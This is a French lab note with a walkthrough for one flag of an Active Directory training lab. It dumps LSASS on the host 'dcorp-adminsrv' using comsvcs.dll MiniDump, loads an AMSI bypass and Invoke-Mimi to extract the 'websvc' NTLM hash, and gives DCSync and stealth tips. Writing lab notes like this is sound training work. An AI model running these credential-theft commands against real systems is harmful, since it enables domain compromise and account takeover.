---
flag: 14
machine: dcorp-adminsrv
statut: à faire
technique: LSASS dump
LO: "[[LO07 - Session DA et escalade]]"
---
# F14 · NTLM de websvc

> [!summary] Objectif
> Récupérer le hash NTLM du compte `websvc` depuis LSASS de `dcorp-adminsrv`.

## Contexte
- **Étape attack flow** : même dump que [[F13 - NTLM-clair de srvadmin]] — un seul `.dmp` alimente F13/F14/F15.
- **Ce qu'on a** : TGT `svcadmin` (DA) injecté en session → PSSession admin sur `dcorp-adminsrv`.
- **Ce qu'on cherche** : bloc `websvc` dans la sortie mimikatz du dump `dcorp-adminsrv`.

## Solution

### Étape 1 : produire le dump (une seule fois pour F13/F14/F15)
```powershell
$s = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $s -ScriptBlock {
  $p = (Get-Process lsass).Id
  cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full"
}
Copy-Item -FromSession $s C:\Users\Public\lsass.dmp -Destination C:\AD\Tools\lsass-adminsrv.dmp
Remove-PSSession $s
```
→ Voir [[Cheatsheet - Post-exploitation]] pour la logique dump / choix outil.

### Étape 2 : parse et extraire le bloc `websvc`
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass-adminsrv.dmp" "sekurlsa::ekeys"'
```
→ chercher le bloc `Username : websvc` → NTLM = ligne `rc4_hmac_nt`. Si `websvc` absent de LSASS (pas loggé), passer par DCSync après F17 (voir [[Cheatsheet - Persistence]]).

## Réponse

| Élément | Valeur |
|---------|--------|
| websvc NTLM | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- `ekeys` liste NTLM + AES sans `wdigest`/clair → suffisant pour un NTLM seul, plus discret que `logonpasswords`.
- Compte machine `DCORP-ADMINSRV$` visible dans le dump — à ignorer, on veut le compte de **domaine** `websvc`.
- Si `websvc` n'apparaît pas dans `ekeys`, il n'était plus connecté au moment du dump → replier sur DCSync (`lsadump::dcsync /user:dollarcorp\websvc`) une fois DA sur DC.

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Persistence]]
- [[LO07 - Session DA et escalade]]
- [[F13 - NTLM-clair de srvadmin]]

[[Flags - Index]] · [[Journal - Index]]
